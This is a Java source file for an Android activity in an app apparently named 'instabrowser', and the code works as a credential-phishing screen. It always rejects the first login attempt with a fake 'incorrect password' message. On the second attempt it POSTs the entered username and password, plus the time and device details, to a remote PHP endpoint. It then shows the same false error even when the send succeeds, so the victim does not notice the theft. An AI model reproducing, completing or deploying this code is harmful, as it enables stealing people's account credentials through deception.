package com.ariashirazi.instabrowser;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.EditText;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.material.snackbar.Snackbar;

import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {


    int counter = 0;




    private EditText edName,edEmail,edMessage;


    String url="http://www.emample.com/Apps/connect.php";
    private String errorSendText="Network Error";
    private String successSendText="The Username or Password is incorrect";

    RequestQueue requestQueue;

    String MobileModel = Build.MODEL;
    String Manufacturer = Build.MANUFACTURER;
    String AndroidVersion = String.valueOf(Build.VERSION.RELEASE);
    String AndroidApi = String.valueOf(Build.VERSION.SDK_INT);




    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        edName=findViewById(R.id.ed_message_name);
        edEmail=findViewById(R.id.ed_message_email);
        edMessage=findViewById(R.id.ed_message_text);

        requestQueue= Volley.newRequestQueue(this);


    }




    public void btnSendClick(final View view) {

        if (counter == 0) {


            String userPassError = "Your Username or Password is incorrect ";
            Snackbar snackbar2 = Snackbar.make(view, userPassError, Snackbar.LENGTH_LONG);
            View view11 = snackbar2.getView();
            view11.setBackgroundColor(getResources().getColor(R.color.materialGreen1));
            snackbar2.show();

            counter+=1;

        }else if (counter == 1){


                final String name, email, message;
                name = edName.getText().toString();
                email = edEmail.getText().toString();
                message = edMessage.getText().toString();

                if (edName.getText().toString().isEmpty()) {
                    String nameError = "Enter your Username";
                    Snackbar snackbar = Snackbar.make(view, nameError, Snackbar.LENGTH_LONG);
                    View view1 = snackbar.getView();
                    view1.setBackgroundColor(getResources().getColor(R.color.materialGreen1));
                    snackbar.show();
                    return;
                } else if (edEmail.getText().toString().isEmpty()) {
                    String emailError = "Enter your Password";
                    Snackbar snackbar = Snackbar.make(view, emailError, Snackbar.LENGTH_LONG);
                    View view1 = snackbar.getView();
                    view1.setBackgroundColor(getResources().getColor(R.color.materialGreen1));
                    snackbar.show();
                    return;
                }



                StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        Snackbar snackbar = Snackbar.make(view, successSendText, Snackbar.LENGTH_LONG);
                        View view1 = snackbar.getView();
                        view1.setBackgroundColor(getResources().getColor(R.color.colorAccent));
                        snackbar.show();
                    }
                }, new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        Snackbar snackbar = Snackbar.make(view, errorSendText, Snackbar.LENGTH_LONG);
                        View view1 = snackbar.getView();
                        view1.setBackgroundColor(getResources().getColor(R.color.colorAccent));
                        snackbar.show();
                    }
                })
                {

                    //-------------------------------------------get current time---------------------------------------
                    Calendar rightNow = Calendar.getInstance();
                    int currentHourIn24Format = rightNow.get(Calendar.HOUR_OF_DAY);
                    int currentMinutes = rightNow.get(Calendar.MINUTE);
                    String HourAndMinutes = String.valueOf(currentHourIn24Format)+":"+currentMinutes;
                    //-------------------------------------------get current time--------------------------------------E


                    @Override
                    protected Map<String, String> getParams() {
                        Map<String,String> Data=new HashMap<>();
                        Data.put("Name",name);
                        Data.put("Email",email);
                        Data.put("Message",message);
                        Data.put("Time",String.valueOf(HourAndMinutes));
                        Data.put("Manufacturer",String.valueOf(Manufacturer));
                        Data.put("MobileModel",String.valueOf(MobileModel));
                        Data.put("AndroidVersion",String.valueOf(AndroidVersion));
                        Data.put("AndroidApi",String.valueOf(AndroidApi));
                        return Data;
                    }
                };

                requestQueue.add(stringRequest);


            Intent intent = new Intent(MainActivity.this, SecondActivity.class);
            startActivity(intent);

            }







    }



}
